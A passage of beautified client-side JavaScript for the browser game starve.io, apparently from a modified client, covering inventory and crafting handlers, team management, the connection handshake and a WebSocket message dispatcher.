                            for (var t = [Be.SUPER_HAMMER, Be.DRAGON_HEART, Be.SWORD_WOOD, Be.SWORD, Be.SWORD_GOLD, Be.SWORD_DIAMOND, Be.SWORD_AMETHYST, Be.REIDITE_SWORD, Be.DRAGON_SWORD, Be.LAVA_SWORD, Be.PIRATE_SWORD, Be.SPEAR, Be.WOOD_SPEAR, Be.GOLD_SPEAR, Be.DIAMOND_SPEAR, Be.AMETHYST_SPEAR, Be.REIDITE_SPEAR, Be.DRAGON_SPEAR, Be.LAVA_SPEAR, Be.CRAB_SPEAR, Be.WOOD_BOW, Be.STONE_BOW, Be.GOLD_BOW, Be.DIAMOND_BOW, Be.AMETHYST_BOW, Be.REIDITE_BOW, Be.DRAGON_BOW, Be.WOOD_SHIELD, Be.STONE_SHIELD, Be.GOLD_SHIELD, Be.DIAMOND_SHIELD, Be.AMETHYST_SHIELD, Be.REIDITE_SHIELD, Be.WAND1, Be.WAND2, Be.PICK_WOOD, Be.PICK, Be.PICK_GOLD, Be.PICK_DIAMOND, Be.PICK_AMETHYST, Be.PICK_REIDITE, Be.SPANNER, Be.PITCHFORK, Be.PITCHFORK2], i = 0; i < t.length; i++) {
                                var n = xe.inv.find_item(t[i]);
                                -1 != n && xe.inv.delete_item(t.length[i], n)
                            }
                            xe.craft.restart()
                        }
                        ,
                        this.decrease_item2 = function (e, t, i) {
                            this.decrease_item(e, 256 * t + i)
                        }
                        ,
                        this.decrease_item = function (e, t) {
                            xe.craft.preview = -1,
                                xe.inv.decrease(e, t, xe.inv.find_item(e)),
                                xe.craft.update()
                        }
                        ,
                        this.accept_build = function (e) {
                            xe.craft.preview = -1,
                                xe.build.wait = !0;
                            var t = xe.inv.find_item(e);
                            xe.inv.decrease(e, 1, t),
                                0 <= t && !xe.inv.n[e] && xe.craft.update(),
                                e == Be.TOTEM && (xe.team = [xe.id])
                        }
                        ,
                        this.cancel_crafting = function () {
                            this.sendJson([31])
                        }
                        ,
                        this.buy_market = function (e) {
                            this.sendJson([32, e.val, e.id])
                        }
                        ,
                        this.update_sign = function (e, t) {
                            this.sendJson([33, e, t])
                        }
                        ,
                        this.send_build = function () {
                            var e, t = Fe.fast_units[xe.uid];
                            t && (e = 2 * Math.PI,
                                this.sendJson([94, xe.craft.preview, Math.floor((t.angle + e) % e * 255 / e), xe.craft.mode]))
                        }
                        ,
                        this.select_inv = function (e) {
                            switch (e) {
                                case Be.BANDAGE:
                                case Be.PLANT:
                                case Be.MEAT:
                                case Be.COOKED_MEAT:
                                case Be.SANDWICH:
                                case Be.BOTTLE_FULL:
                                case Be.COOKIE:
                                case Be.CAKE:
                                case Be.ICE:
                                case Be.BREAD:
                                case Be.PUMPKIN:
                                case Be.TOMATO:
                                case Be.CACTUS:
                                case Be.CARROT:
                                case Be.WATERMELON:
                                case Be.ALOE_VERA:
                                case Be.GARLIC:
                                case Be.FOODFISH:
                                case Be.FOODFISH_COOKED:
                                case Be.CRAB_STICK:
                                case Be.CRAB_LOOT:
                                case Be.CANDY:
                                case Be.SUGAR_CAN:
                                    xe.craft.preview = -1,
                                        this.sendJson([5, e]);
                                    break;
                                case Be.WORKBENCH:
                                case Be.SPIKE:
                                case Be.SEED:
                                case Be.WHEAT_SEED:
                                case Be.PUMPKIN_SEED:
                                case Be.TOMATO_SEED:
                                case Be.CARROT_SEED:
                                case Be.GARLIC_SEED:
                                case Be.THORNBUSH_SEED:
                                case Be.WATERMELON_SEED:
                                case Be.ALOE_VERA_SEED:
                                case Be.FIRE:
                                case Be.WALL:
                                case Be.STONE_WALL:
                                case Be.GOLD_WALL:
                                case Be.DIAMOND_WALL:
                                case Be.BIG_FIRE:
                                case Be.CHEST:
                                case Be.RESURRECTION:
                                case Be.EMERALD_MACHINE:
                                case Be.WOOD_DOOR:
                                case Be.STONE_DOOR:
                                case Be.GOLD_DOOR:
                                case Be.DIAMOND_DOOR:
                                case Be.AMETHYST_DOOR:
                                case Be.REIDITE_DOOR:
                                case Be.WOOD_DOOR_SPIKE:
                                case Be.STONE_DOOR_SPIKE:
                                case Be.GOLD_DOOR_SPIKE:
                                case Be.DIAMOND_DOOR_SPIKE:
                                case Be.AMETHYST_DOOR_SPIKE:
                                case Be.REIDITE_DOOR_SPIKE:
                                case Be.STONE_SPIKE:
                                case Be.GOLD_SPIKE:
                                case Be.DIAMOND_SPIKE:
                                case Be.FURNACE:
                                case Be.AMETHYST_WALL:
                                case Be.AMETHYST_SPIKE:
                                case Be.REIDITE_WALL:
                                case Be.REIDITE_SPIKE:
                                case Be.BRIDGE:
                                case Be.ROOF:
                                case Be.PLOT:
                                case Be.WINDMILL:
                                case Be.EXTRACTOR_MACHINE_STONE:
                                case Be.EXTRACTOR_MACHINE_GOLD:
                                case Be.EXTRACTOR_MACHINE_DIAMOND:
                                case Be.EXTRACTOR_MACHINE_AMETHYST:
                                case Be.EXTRACTOR_MACHINE_REIDITE:
                                case Be.BED:
                                case Be.GARLAND:
                                case Be.WELL:
                                case Be.SIGN:
                                case Be.BREAD_OVEN:
                                case Be.TOTEM:
                                case Be.WOOD_TOWER:
                                    xe.zombie || (xe.craft.preview === e ? xe.craft.preview = -1 : xe.craft.preview = e);
                                    break;
                                case Be.SWORD:
                                case Be.SWORD_WOOD:
                                case Be.SWORD_GOLD:
                                case Be.SWORD_DIAMOND:
                                case Be.SWORD_AMETHYST:
                                case Be.REIDITE_SWORD:
                                case Be.PIRATE_SWORD:
                                case Be.DRAGON_SWORD:
                                case Be.LAVA_SWORD:
                                case Be.WOOD_BOW:
                                case Be.STONE_BOW:
                                case Be.GOLD_BOW:
                                case Be.DIAMOND_BOW:
                                case Be.AMETHYST_BOW:
                                case Be.REIDITE_BOW:
                                case Be.DRAGON_BOW:
                                case Be.WAND1:
                                case Be.WAND2:
                                case Be.WOOD_SPEAR:
                                case Be.SPEAR:
                                case Be.GOLD_SPEAR:
                                case Be.DIAMOND_SPEAR:
                                case Be.AMETHYST_SPEAR:
                                case Be.AMETHYST_REIDITE:
                                case Be.DRAGON_SPEAR:
                                case Be.LAVA_SPEAR:
                                case Be.REIDITE_SPEAR:
                                case Be.CRAB_SPEAR:
                                    xe.zombie || (xe.craft.preview = -1,
                                        (t = Fe.fast_units[xe.uid]) && t.right === e ? this.sendJson([5, Be.HAND]) : (xe.weapon.wait = !0,
                                            this.sendJson([5, e])));
                                    break;
                                case Be.PICK:
                                case Be.PICK_WOOD:
                                case Be.PICK_GOLD:
                                case Be.PICK_DIAMOND:
                                case Be.HAMMER:
                                case Be.HAMMER_GOLD:
                                case Be.HAMMER_DIAMOND:
                                case Be.BOOK:
                                case Be.HAMMER_AMETHYST:
                                case Be.HAMMER_REIDITE:
                                case Be.PICK_AMETHYST:
                                case Be.PICK_REIDITE:
                                case Be.SUPER_HAMMER:
                                case Be.SHOVEL:
                                case Be.SHOVEL_GOLD:
                                case Be.SHOVEL_DIAMOND:
                                case Be.SHOVEL_AMETHYST:
                                case Be.SPANNER:
                                case Be.MACHETE:
                                case Be.PITCHFORK:
                                case Be.PITCHFORK2:
                                case Be.SADDLE:
                                case Be.WATERING_CAN_FULL:
                                case Be.WOOD_SHIELD:
                                case Be.STONE_SHIELD:
                                case Be.GOLD_SHIELD:
                                case Be.DIAMOND_SHIELD:
                                case Be.AMETHYST_SHIELD:
                                case Be.REIDITE_SHIELD:
                                    xe.zombie || (xe.craft.preview = -1,
                                        (t = Fe.fast_units[xe.uid]) && t.right === e ? this.sendJson([5, Be.HAND]) : this.sendJson([5, e]));
                                    break;
                                case Be.BOAT:
                                case Be.SLED:
                                case Be.MOUNT_BOAR:
                                case Be.BABY_MAMMOTH:
                                case Be.CRAB_BOSS:
                                case Be.BABY_DRAGON:
                                case Be.BABY_LAVA:
                                case Be.HAWK:
                                case Be.PLANE:
                                case Be.NIMBUS:
                                    var t;
                                    xe.zombie || (xe.craft.preview = -1,
                                        t = Fe.fast_units[xe.uid],
                                        this.sendJson([5, e]));
                                    break;
                                case Be.CROWN_GREEN:
                                case Be.CROWN_ORANGE:
                                case Be.CROWN_BLUE:
                                case Be.WOOD_HELMET:
                                case Be.STONE_HELMET:
                                case Be.GOLD_HELMET:
                                case Be.DIAMOND_HELMET:
                                case Be.AMETHYST_HELMET:
                                case Be.REIDITE_HELMET:
                                case Be.DIAMOND_PROTECTION:
                                case Be.AMETHYST_PROTECTION:
                                case Be.REIDITE_PROTECTION:
                                case Be.DRAGON_HELMET:
                                case Be.LAVA_HELMET:
                                case Be.WITCH:
                                case Be.CROWN_CRAB:
                                case Be.SUPER_DIVING_SUIT:
                                    (t = Fe.fast_units[xe.uid]) && t.clothe !== e && (xe.helmet.wait = !0),
                                        this.sendJson([5, e]);
                                    break;
                                case Be.EARMUFFS:
                                case Be.HOOD:
                                case Be.PEASANT:
                                case Be.WINTER_PEASANT:
                                case Be.COAT:
                                case Be.CAP_SCARF:
                                case Be.FUR_HAT:
                                case Be.PILOT_HELMET:
                                case Be.TURBAN1:
                                case Be.TURBAN2:
                                case Be.CHRISTMAS_HAT:
                                case Be.ELF_HAT:
                                case Be.WINTER_HOOD:
                                case Be.EXPLORER_HAT:
                                case Be.PIRATE_HAT:
                                case Be.DIVING_MASK:
                                    this.sendJson([5, e])
                            }
                        }
                        ,
                        this.delete_inv = function (e) {
                            this.sendJson([6, e])
                        }
                        ,
                        this.delete_inv_ok = function (e) {
                            xe.build.wait = !0;
                            var t = xe.inv.find_item(e);
                            xe.inv.delete_item(e, t),
                                xe.craft.update()
                        }
                        ,
                        this.recycle_inv = function (e) {
                            this.sendJson([29, e])
                        }
                        ,
                        this.delete_one_inv = function (e) {
                            this.sendJson([28, e])
                        }
                        ,
                        this.delete_one_inv_ok = function (e) {
                            xe.build.wait = !0;
                            var t = xe.inv.find_item(e);
                            xe.inv.decrease(e, 1, t),
                                xe.craft.update()
                        }
                        ,
                        this.delete_single_inv = function (e) {
                            var t = e[1]
                                , e = e[2]
                                , i = (xe.build.wait = !0,
                                    xe.inv.find_item(t));
                            xe.inv.decrease(t, e, i),
                                xe.craft.update()
                        }
                        ,
                        this.stop_attack = function () {
                            this.sendJson([14])
                        }
                        ,
                        this.send_attack = function (e) {
                            var t = 2 * Math.PI;
                            this.sendJson([4, Math.floor((e + t) % t * 255 / t)])
                        }
                        ,
                        this.send_angle = function (e) {
                            var t = 2 * Math.PI;
                            this.sendJson([3, Math.floor((e + t) % t * 255 / t)])
                        }
                        ,
                        this.send_move = function (e) {
                            this.sendJson([2, e])
                        }
                        ,
                        this.send_command = function (e) {
                            this.sendJson([36, e])
                        }
                        ,
                        this.send_chat = function (e) {
                            var t = Fe.fast_units[xe.uid];
                            xe.zombie ? .5 < Math.random() ? t.text.push(e.substring(0, 25) + " ..." + ZOMBIE_GRUMBLE) : t.text.push(ZOMBIE_GRUMBLE + "... " + e.substring(0, 25)) : t.text.push(e),
                                this.sendJson([0, e])
                        }
                        ,
                        this.move_units = function (e) {
                            var t = player.select.units;
                            if (0 != t.length) {
                                var i = [2]
                                    , n = [];
                                Utils.sub_vector(e, {
                                    x: player.cam.rx,
                                    y: player.cam.ry
                                }),
                                    i.push(e.x),
                                    i.push(e.y);
                                for (var r = 0; r < t.length; r++)
                                    n.push(t[r].oid);
                                i.push(n),
                                    this.sendJson(i)
                            }
                        }
                        ,
                        this.cam_delay = 0,
                        this.last_cam = {
                            i: 0,
                            j: 0
                        },
                        this.update_cam = function () {
                            var e, t, i;
                            ho - this.cam_delay > i2.CAM_DELAY && (this.cam_delay = ho,
                                e = xe.cam,
                                t = Math.floor(e.x / 100),
                                i = Math.floor(e.y / 100),
                                this.last_cam.i == t && this.last_cam.j == i || (this.sendJson([1, Math.floor(-e.x), Math.floor(-e.y)]),
                                    this.last_cam.i = t,
                                    this.last_cam.j = i))
                        }
                        ,
                        this.ping_delay = 0,
                        this.try_ping = function () {
                            ho - this.ping_delay > i2.PING_DELAY && (this.ping_delay = ho,
                                this.ping())
                        }
                        ,
                        this.lost = function () {
                            xe.reconnect.enabled = !0,
                                this._current_id == this.socket._current_id && (this._current_id++,
                                    this.socket.close(),
                                    client.connect())
                        }
                        ,
                        this.join_new_team = function (e) {
                            this.new_alert(We[TEXT.JOIN_TEAM]);
                            var t = Fe.units[Ye.TOTEM];
                            for (let e = 0; e < t.length; e++)
                                l0(t[e].pid) && (T0.x = t[e].x,
                                    T0.y = t[e].y);
                            h0();
                            for (var i = 1; i < e.length; i++)
                                xe.team.push(e[i])
                        }
                        ,
                        this.new_member_team = function (e) {
                            this.new_alert(Fe.players[e].nickname + We[TEXT.JOINED_TEAM]),
                                xe.team.push(e);
                            e = document.getElementById("team_box");
                            -1 != Je.team_buttons_id && "inline-block" == e.style.display && Je.team_buttons[Je.team_buttons_id].action(),
                                h0()
                        }
                        ,
                        this.destroy_team = function () {
                            this.new_alert(We[TEXT.TEAM_DESTROYED]),
                                xe.totem.wait = !0,
                                xe.team = [],
                                document.getElementById("team_box").style.display = "none",
                                h0()
                        }
                        ,
                        this.exclude_team = function (e) {
                            if (e == xe.id)
                                this.new_alert(We[TEXT.LEFT_TEAM]),
                                    xe.totem.wait = !0,
                                    xe.team = [],
                                    document.getElementById("team_box").style.display = "none";
                            else {
                                this.new_alert(Fe.players[e].nickname + We[TEXT.LEFT_TEAM2]);
                                for (var t = 0; t < xe.team.length; t++)
                                    if (xe.team[t] == e) {
                                        xe.team.splice(t, 1);
                                        break
                                    }
                                var i = document.getElementById("team_box");
                                -1 != Je.team_buttons_id && "inline-block" == i.style.display && Je.team_buttons[Je.team_buttons_id].action()
                            }
                            h0()
                        }
                        ,
                        this.steal_token = function () {
                            xe.alive = !1,
                                this.new_alert(We[TEXT.TOKEN]),
                                this._current_id == this.socket._current_id && (this._current_id++,
                                    Je.quit(Se.run),
                                    this.socket.close())
                        }
                        ,
                        this.killed = function (e, t) {
                            xe.alive = !1;
                            var i = t[2]
                                , t = t[3];
                            xe.die.howdie = n[e][Math.floor(Math.random() * n[e].length)],
                                xe.die.score = Utils.simplify_number(Fe.players[xe.id].score),
                                xe.die.bank = Utils.simplify_number(i),
                                xe.die.kill = t,
                                this.new_alert(We[TEXT.YOU_DEAD]),
                                this._current_id == this.socket._current_id && (this._current_id++,
                                    Settings.Respawn ? (this.socket.close(),
                                        client.connect()) : (this.socket.close(),
                                            Je.quit(To.run)),
                                    window.aiptag.cmd.display.push(function () {
                                        window.aipDisplayTag.display("MFN_starve-io_300x250")
                                    }))
                        }
                        ,
                        this.ping = function () {
                            try {
                                this.sendJson([i2.PING])
                            } catch (e) {
                                console.log("[Famishs/ConnectionException] WebSocket is not eligble"),
                                    this.lost(),
                                    console.log("[Famishs/Session] Trying to restore session..")
                            }
                        }
                        ,
                        this.check_state = function () {
                            3 == this.socket.readyState && (this.timeout_server -= i2.TIMEOUT_SERVER)
                        }
                        ,
                        this.check_pong = function () {
                            qe > i2.LOOSE_FOCUS && (this.timeout_server = ho),
                                ho - this.timeout_server > i2.TIMEOUT_SERVER && (this.timeout_server = ho,
                                    this.lost())
                        }
                        ,
                        this.handshake = function (e) {
                            clearTimeout(this.timeout_handler),
                                document.getElementById("commandMainBoxName").innerHTML = this.mode_list[this.current_mode][this.selected_server[this.current_mode]].a,
                                document.getElementById("exploreForest").src = "img/forest-leaf.png",
                                document.getElementById("exploreWinter").src = "img/winter-flake.png",
                                document.getElementById("exploreDesert").src = "img/desert-cactus.png",
                                document.getElementById("exploreLava").src = "img/lava-volcano.png",
                                this.timeout_server = ho,
                                xe.gauges.cold.ed = xe.gauges.cold.em,
                                xe.gauges.hunger.ed = xe.gauges.hunger.em,
                                xe.gauges.thirst.ed = xe.gauges.thirst.em,
                                xe.gauges.oxygen.ed = xe.gauges.oxygen.em,
                                xe.gauges.warm.ed = xe.gauges.warm.em,
                                xe.gauges.l = 1,
                                xe.gauges.c = 1,
                                xe.gauges.h = 1,
                                xe.gauges.t = 1,
                                xe.gauges.o = 1,
                                xe.gauges.wa = 1,
                                xe.bigmap = !1,
                                Je.info_box.display = 0,
                                xe.inv.can_select = [],
                                xe.inv.n = [],
                                xe.inv.max = Ue.WITHOUT_BAG,
                                xe.inv.bonus = 0,
                                xe.inv.bag = 0,
                                xe.inv.id = -1,
                                Je.show_recipe_book = 1,
                                Je.show_clock = 1,
                                Je.show_quest = 1,
                                Je.show_market = 1,
                                xe.alive = !0,
                                xe.inv.drag.stop(),
                                xe.craft.can_craft = [],
                                xe.craft.crafting = !1,
                                xe.craft.can_build = !1,
                                xe.craft.preview = -1,
                                xe.craft.id = -1,
                                xe.craft.workbench = !1,
                                xe.craft.well = !1,
                                xe.craft.fire = !1,
                                xe.craft.water = !1,
                                xe.craft.timeout = new Utils.LinearAnimation(!1, 0, 1, 0, 1, 1),
                                xe.weapon.timeout = new Utils.LinearAnimation(!1, 0, 1, 0, .1, 1),
                                xe.weapon.wait = !1,
                                xe.helmet.timeout = new Utils.LinearAnimation(!1, 0, 1, 0, .2, 1),
                                xe.helmet.wait = !1,
                                xe.build.timeout = new Utils.LinearAnimation(!1, 0, 1, 0, 1, 1),
                                xe.build.wait = !1,
                                xe.totem.id = -1,
                                xe.totem.pid = -1,
                                xe.totem.wait = !1,
                                xe.totem.timeout = new Utils.LinearAnimation(!1, 0, 1, 0, 1 / 30, 1),
                                Je.minimap.marker.x = -1,
                                Je.minimap.marker.y = -1,
                                Je.craft_list.open = !1,
                                Je.minimap.players = [],
                                xe.show_spectators.enabled = !1,
                                Fe.mode = e[1],
                                void 0 !== e[20] && void 0 !== e[21] && (Fe.nw = e[20],
                                    Fe.nh = e[21],
                                    Fe.w = Fe.nw * Fe.dw,
                                    Fe.h = Fe.nh * Fe.dh),
                                Fe.islands = e[22],
                                Fe.custom_map = e[23],
                                a.welcome(e[24]),
                                a.new_recipes(e[25]),
                                xe.desert.tempest = e[26],
                                xe.blizzard = 0,
                                xe.winter.tempest = e[27],
                                Fe.generate_world(e[19]),
                                Fe.time = e[5],
                                Fe.clock.hour = e[15],
                                Fe.clock.init = (new Date).getTime(),
                                Je.quests.born = e[16],
                                Fe.transition = !1,
                                xe.day = e[2],
                                Je.quests.reset(),
                                xe.team = e[8],
                                Fe.units[Ye.PLAYERS] = [],
                                Fe.units[Ye.FRUIT] = [],
                                Fe.units[Ye.WORKBENCH] = [],
                                Fe.units[Ye.FIRE] = [],
                                Fe.units[Ye.BIG_FIRE] = [],
                                Fe.units[Ye.SEED] = [],
                                Fe.units[Ye.WHEAT_SEED] = [],
                                Fe.units[Ye.PUMPKIN_SEED] = [],
                                Fe.units[Ye.TOMATO_SEED] = [],
                                Fe.units[Ye.CARROT_SEED] = [],
                                Fe.units[Ye.GARLIC_SEED] = [],
                                Fe.units[Ye.THORNBUSH_SEED] = [],
                                Fe.units[Ye.WATERMELON_SEED] = [],
                                Fe.units[Ye.ALOE_VERA_SEED] = [],
                                Fe.units[Ye.WALL] = [],
                                Fe.units[Ye.STONE_WALL] = [],
                                Fe.units[Ye.GOLD_WALL] = [],
                                Fe.units[Ye.DIAMOND_WALL] = [],
                                Fe.units[Ye.WOOD_DOOR] = [],
                                Fe.units[Ye.STONE_DOOR] = [],
                                Fe.units[Ye.GOLD_DOOR] = [],
                                Fe.units[Ye.DIAMOND_DOOR] = [],
                                Fe.units[Ye.WOOD_DOOR_SPIKE] = [],
                                Fe.units[Ye.STONE_DOOR_SPIKE] = [],
                                Fe.units[Ye.GOLD_DOOR_SPIKE] = [],
                                Fe.units[Ye.DIAMOND_DOOR_SPIKE] = [],
                                Fe.units[Ye.AMETHYST_DOOR_SPIKE] = [],
                                Fe.units[Ye.REIDITE_DOOR_SPIKE] = [],
                                Fe.units[Ye.CHEST] = [],
                                Fe.units[Ye.RESURRECTION] = [],
                                Fe.units[Ye.EMERALD_MACHINE] = [],
                                Fe.units[Ye.SPIKE] = [],
                                Fe.units[Ye.STONE_SPIKE] = [],
                                Fe.units[Ye.GOLD_SPIKE] = [],
                                Fe.units[Ye.DIAMOND_SPIKE] = [],
                                Fe.units[Ye.WOLF] = [],
                                Fe.units[Ye.BOAR] = [],
                                Fe.units[Ye.CRAB_BOSS] = [],
                                Fe.units[Ye.BABY_DRAGON] = [],
                                Fe.units[Ye.BABY_LAVA] = [],
                                Fe.units[Ye.HAWK] = [],
                                Fe.units[Ye.TREASURE_CHEST] = [],
                                Fe.units[Ye.DEAD_BOX] = [],
                                Fe.units[Ye.GIFT] = [],
                                Fe.units[Ye.CRATE] = [],
                                Fe.units[Ye.BREAD_OVEN] = [],
                                Fe.units[Ye.PIRANHA] = [],
                                Fe.units[Ye.KRAKEN] = [],
                                Fe.units[Ye.CRAB] = [],
                                Fe.units[Ye.FOX] = [],
                                Fe.units[Ye.BEAR] = [],
                                Fe.units[Ye.MAMMOTH] = [],
                                Fe.units[Ye.BABY_MAMMOTH] = [],
                                Fe.units[Ye.VULTURE] = [],
                                Fe.units[Ye.SAND_WORM] = [],
                                Fe.units[Ye.DRAGON] = [],
                                Fe.units[Ye.LAVA_DRAGON] = [],
                                Fe.units[Ye.FLAME] = [],
                                Fe.units[Ye.WHEAT_MOB] = [],
                                Fe.units[Ye.ALOE_VERA_MOB] = [],
                                Fe.units[Ye.PUMPKIN_MOB] = [],
                                Fe.units[Ye.GARLIC_MOB] = [],
                                Fe.units[Ye.THORNBUSH_MOB] = [],
                                Fe.units[Ye.RABBIT] = [],
                                Fe.units[Ye.PENGUIN] = [],
                                Fe.units[Ye.SPELL] = [],
                                Fe.units[Ye.FIREFLY] = [],
                                Fe.units[Ye.SPIDER] = [],
                                Fe.units[Ye.FURNACE] = [],
                                Fe.units[Ye.AMETHYST_WALL] = [],
                                Fe.units[Ye.AMETHYST_SPIKE] = [],
                                Fe.units[Ye.AMETHYST_DOOR] = [],
                                Fe.units[Ye.REIDITE_WALL] = [],
                                Fe.units[Ye.REIDITE_SPIKE] = [],
                                Fe.units[Ye.REIDITE_DOOR] = [],
                                Fe.units[Ye.TOTEM] = [],
                                Fe.units[Ye.WOOD_TOWER] = [],
                                Fe.units[Ye.BRIDGE] = [],
                                Fe.units[Ye.ROOF] = [],
                                Fe.units[Ye.PLOT] = [],
                                Fe.units[Ye.WINDMILL] = [],
                                Fe.units[Ye.EXTRACTOR_MACHINE_STONE] = [],
                                Fe.units[Ye.EXTRACTOR_MACHINE_GOLD] = [],
                                Fe.units[Ye.EXTRACTOR_MACHINE_DIAMOND] = [],
                                Fe.units[Ye.EXTRACTOR_MACHINE_AMETHYST] = [],
                                Fe.units[Ye.EXTRACTOR_MACHINE_REIDITE] = [],
                                Fe.units[Ye.GARLAND] = [],
                                Fe.units[Ye.BED] = [],
                                Fe.units[Ye.WELL] = [],
                                Fe.units[Ye.SIGN] = [],
                                Fe.fast_units = [],
                                Fe.max_units = e[7],
                                xe.id = e[9],
                                xe.uid = xe.id * Fe.max_units,
                                Xe.loaded && (Xe.players[0].uid = xe.uid,
                                    Xe.players[0].free = 0),
                                Ao.clear_directionnal(),
                                xe.cam.change(e[3], e[10]),
                                Fe.players = [];
                            for (var t = Fe.players, i = 0; i < 100; i++)
                                t.push(new a2);
                            for (var i = 0, n = e[4]; i < n.length; i++) {
                                var r = t[n[i].i];
                                r.nickname = n[i].n,
                                    r.skin = n[i].s,
                                    r.accessory = n[i].a,
                                    r.crate = n[i].c,
                                    r.book = n[i].b,
                                    r.dead = n[i].d,
                                    r.baglook = n[i].g,
                                    r.level = n[i].l,
                                    r.score = Utils.restore_number(n[i].p),
                                    r.alive = !0,
                                    1 == $r && (r.nickname += "|" + n[i].i)
                            }
                            if (xe.ldb.sort(),
                                Fe.mode === Ue.MODE_HUNGER_GAMES && "spectator" === Fe.players[xe.id].nickname ? xe.spectator = !0 : xe.spectator = !1,
                                Fe.mode === Ue.MODE_ZOMBIES && Fe.players[xe.id].skin === Ue.ZOMBIE_SKIN ? xe.zombie = !0 : xe.zombie = !1,
                                Fe.mode === Ue.MODE_VAMPIRES && Fe.players[xe.id].skin === Ue.VAMPIRE_SKIN ? xe.vampire = !0 : xe.vampire = !1,
                                Cookies.set("starve_token", xe.token),
                                0 === e[12]) {
                                xe.shop.delay = 0,
                                    Je.quests.restore(e[17]);
                                var o = e[14];
                                for (o[Be.BAG] && xe.inv.update_bag_size(1, 0),
                                    i = 0; i < o.length; i++)
                                    if (o[i]) {
                                        if (i == Be.BAG)
                                            continue;
                                        if (i == Be.HAND)
                                            continue;
                                        this.gather([0, i, o[i]])
                                    }
                                xe.shop.open = !1
                            } else
                                Fe.mode === Ue.MODE_LEGACY ? this.gather([0, Be.SANDWORM_JUICE, 1]) : Fe.mode === Ue.MODE_VAMPIRES && (xe.vampire ? this.gather([0, Be.ROOF, 4]) : this.gather([0, Be.GARLIC_SEED, 3])),
                                    Fe.mode === Ue.MODE_PVP || Fe.mode === Ue.MODE_VAMPIRES || Fe.mode === Ue.MODE_EXPERIMENTAL || Fe.mode === Ue.MODE_LEGACY ? (xe.shop.delay = (new Date).getTime(),
                                        xe.shop.open = !0,
                                        xe.shop.value = e[13],
                                        Je.shop.init()) : (xe.shop.delay = 0,
                                            xe.shop.open = !1,
                                            xe.shop.value = 0),
                                    xe.token_id = e[12].toString();
                            xe.ghost.enabled = e[6],
                                xe.ghost.delay = -1,
                                xe.ghost.label = null,
                                xe.ghost.now = -1,
                                Cookies.set("starve_token_id", xe.token_id),
                                xe.reconnect.enabled ? (xe.reconnect.rotate = 0,
                                    xe.reconnect.enabled = !1) : Se.quit(Je.run)
                        }
                        ,
                        this.connect = function () {
                            this.timeout_number = 0,
                                this.connect_timeout()
                        }
                        ,
                        this.connect_timeout = function () {
                            var e = this.selected_server[this.current_mode]
                                , t = this.mode_list[this.current_mode][e].i
                                , i = this.mode_list[this.current_mode][e].p
                                , e = this.mode_list[this.current_mode][e].ssl
                                , t = t + ":" + i;
                            this.socket = new window.WebSocket("ws" + (1 === e ? "s" : "") + "://" + t + "/id=" + ~~(999684281 * Math.random())),
                                this.socket.binaryType = "arraybuffer",
                                this.socket._current_id = this._current_id,
                                this.socket.onmessage = function (e) {
                                    if (this._current_id == a._current_id)
                                        if ("string" == typeof e.data) {
                                            var t = JSON.parse(e.data);
                                            switch (t[0]) {
                                                case 0:
                                                    a.chat(t);
                                                    break;
                                                case 1:
                                                    a.kick(t[1]);
                                                    break;
                                                case 2:
                                                    a.new_player(t);
                                                    break;
                                                case 3:
                                                    a.handshake(t);
                                                    break;
                                                case 4:
                                                    a.message(t[1]);
                                                    break;
                                                case 5:
                                                    a.commands(t);
                                                    break;
                                                case 6:
                                                    a.welcome(t[1]);
                                                    break;
                                                case 7:
                                                    a.kicked_before_join(t[1]);
                                                    break;
                                                case 8:
                                                    a.leaderboard(t[1]);
                                                    break;
                                                case 9:
                                                    a.decrease_item(t[1], t[2]);
                                                    break;
                                                case 10:
                                                    a.gather([0, t[1], t[2]]);
                                                    break;
                                                case 11:
                                                    window.drawShit = [t[1]];
                                                    break;
                                                case 12:
                                                    window.drawShit2 = t[1];
                                                    break;
                                                case 13:
                                                    a.killed(t[1], t);
                                                    break;
                                                case 14:
                                                    a.mute();
                                                    break;
                                                case 15:
                                                    a.throttle();
                                                    break;
                                                case 16:
                                                    a.recover_focus(t[1], t[2]);
                                                    break;
                                                case 17:
                                                    a.denied_with_callback(t[1]);
                                                    break;
                                                case 18:
                                                    a.recreate_session()
                                            }
                                        } else {
                                            var i = new Uint8Array(e.data);
                                            switch (i[0]) {
                                                case 0:
                                                    a.units(e.data, i, !1);
                                                    break;
                                                case 1:
                                                    a.units(e.data, i, !0);
                                                    break;
                                                case 2:
                                                    a.cancel_craft();
                                                    break;
                                                case 3:
                                                    a.gather(new Uint16Array(e.data));
                                                    break;
                                                case 5:
                                                    a.full();
                                                    break;
                                                case 6:
                                                    a.dont_harvest();
                                                    break;
                                                case 7:
                                                    a.hitten(e.data, 0);
                                                    break;
                                                case 8:
                                                    a.build_stop(i[1]);
                                                    break;
                                                case 9:
                                                    a.build_ok(i[1]);
                                                    break;
                                                case 10:
                                                    a.inv_full();
                                                    break;
                                                case 11:
                                                    a.decrease_item(i[1], i[2]);
                                                    break;
                                                case 12:
                                                    a.workbench(i[1]);
                                                    break;
                                                case 13:
                                                    a.hitten(e.data, 1);
                                                    break;
                                                case 14:
                                                    a.mute();
                                                    break;
                                                case 15:
                                                    a.kill_player(i[1]);
                                                    break;
                                                case 16:
                                                    a.gauges(i[1], i[2], i[3], i[4], i[5], i[6], i[7]);
                                                    break;
                                                case 18:
                                                    a.empty_res();
                                                    break;
                                                case 19:
                                                    a.fire(i[1]);
                                                    break;
                                                case 20:
                                                    a.survive();
                                                    break;
                                                case 21:
                                                    a.leaderboard(e.data);
                                                    break;
                                                case 22:
                                                    a.get_time(i, e.data);
                                                    break;
                                                case 23:
                                                    a.set_cam(e.data);
                                                    break;
                                                case 24:
                                                    a.accept_build(i[1]);
                                                    break;
                                                case 26:
                                                    a.minimap(i);
                                                    break;
                                                case 27:
                                                    a.fail_restore();
                                                    break;
                                                case 28:
                                                    a.ghost(i[1]);
                                                    break;
                                                case 29:
                                                    a.reborn();
                                                    break;
                                                case 30:
                                                    a.steal_token();
                                                    break;
                                                case 31:
                                                    a.join_new_team(i);
                                                    break;
                                                case 32:
                                                    a.exclude_team(i[1]);
                                                    break;
                                                case 33:
                                                    a.new_member_team(i[1]);
                                                    break;
                                                case 34:
                                                    a.destroy_team();
                                                    break;
                                                case 35:
                                                    a.kit_ok(i[1]);
                                                    break;
                                                case 36:
                                                    a.water(i[1]);
                                                    break;
                                                case 37:
                                                    a.gauges_life(i[1], i[2]);
                                                    break;
                                                case 38:
                                                    a.gauges_food(i[1]),
                                                        window.AutoEatWait = !1;
                                                    break;
                                                case 39:
                                                    a.gauges_water(i[1]),
